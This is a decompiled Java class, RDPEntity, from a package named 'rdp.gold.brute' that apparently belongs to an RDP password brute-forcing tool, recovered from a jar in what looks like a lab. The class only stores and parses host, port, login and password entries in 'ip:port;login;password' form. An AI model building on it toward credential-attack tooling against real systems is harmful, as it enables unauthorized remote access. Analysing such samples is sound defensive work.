/*    */ package rdp.gold.brute;
/*    */ 
/*    */ import java.util.Scanner;
/*    */ 
/*    */ public class RDPEntity
/*    */ {
/*    */   private String ip;
/*    */   private int port;
/*    */   private String login;
/*    */   private String password;
/*    */   
/*    */   public RDPEntity() {}
/*    */   
/*    */   public RDPEntity(String ip, int port, String login, String password) {
/* 15 */     this.ip = ip;
/*    */     
/* 17 */     this.port = port;
/*    */     
/* 19 */     this.login = login;
/*    */     
/* 21 */     this.password = password;
/*    */   }
/*    */   
/*    */   public static RDPEntity parse(String rdp) {
/* 25 */     Scanner scanner = new Scanner(rdp).useDelimiter(";");
/* 26 */     Scanner scannerHost = new Scanner(scanner.next()).useDelimiter(":");
/*    */     
/* 28 */     RDPEntity rdpEntity = new RDPEntity();
/* 29 */     rdpEntity.setIp(scannerHost.next());
/* 30 */     rdpEntity.setPort(scannerHost.nextInt());
/* 31 */     rdpEntity.setLogin(scanner.next());
/*    */     
/* 33 */     if (scanner.hasNext()) {
/* 34 */       rdpEntity.setPassword(scanner.next());
/*    */     } else {
/* 36 */       rdpEntity.setPassword("");
/*    */     }
/*    */     
/* 39 */     return rdpEntity;
/*    */   }
/*    */   
/*    */   public String getIp() {
/* 43 */     return this.ip;
/*    */   }
/*    */   
/*    */   public void setIp(String ip) {
/* 47 */     this.ip = ip;
/*    */   }
/*    */   
/*    */   public int getPort() {
/* 51 */     return this.port;
/*    */   }
/*    */   
/*    */   public void setPort(int port) {
/* 55 */     this.port = port;
/*    */   }
/*    */   
/*    */   public String getLogin() {
/* 59 */     return this.login;
/*    */   }
/*    */   
/*    */   public void setLogin(String login) {
/* 63 */     this.login = login;
/*    */   }
/*    */   
/*    */   public String getPassword() {
/* 67 */     return this.password;
/*    */   }
/*    */   
/*    */   public void setPassword(String password) {
/* 71 */     this.password = password;
/*    */   }
/*    */   
/*    */   public String toString() {
/* 75 */     return this.ip + ":" + this.port + ";" + this.login + ";" + this.password;
/*    */   }
/*    */ }


/* Location:              C:\Users\Lab\Desktop\a.jar!\rdp\gold\brute\RDPEntity.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       0.7.1
 */